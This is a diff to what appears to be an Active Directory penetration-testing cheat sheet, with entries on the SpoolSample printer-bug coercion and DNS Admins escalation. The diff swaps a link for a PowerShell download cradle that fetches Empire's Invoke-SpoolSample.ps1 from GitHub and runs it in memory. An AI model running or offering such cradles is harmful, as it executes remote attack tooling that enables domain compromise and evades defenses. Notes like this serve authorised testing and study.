@@ -678,8 +678,7 @@ klist
 # Why wait when you can spool?
 https://github.com/leechristensen/SpoolSample
 
-https://github.com/BC-SECURITY/Empire/blob/main/empire/server/data/module_source/exploitation/Invoke-SpoolSample.ps1
-
+```iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/exploitation/Invoke-SpoolSample.ps1")```
 
 # DNS Admins
 https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83
